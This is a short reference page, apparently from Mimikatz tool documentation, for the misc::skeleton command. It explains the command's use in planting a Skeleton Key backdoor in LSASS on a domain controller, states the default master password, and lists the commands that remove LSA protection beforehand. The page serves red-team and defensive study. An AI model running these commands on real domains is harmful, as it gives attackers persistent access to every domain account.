# skeleton

`misc::skeleton` injects a "[Skeleton Key](https://www.thehacker.recipes/ad/persistence/skeleton-key)" into the LSASS process on the domain controller. A "master password" can then be used to authenticate as any domain user, while domain users can authenticate with their own password. The default skeleton key password is `mimikatz`**. **

The command has the following argument:

* `/letaes`

{% hint style="info" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # misc::skeleton
```

If the LSA protection is enabled, then the following commands can be used to remove it.

```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
```

More information on the Skeleton Key attack on The Hacker Recipes.

{% embed url="https://www.thehacker.recipes/ad/persistence/skeleton-key" %}
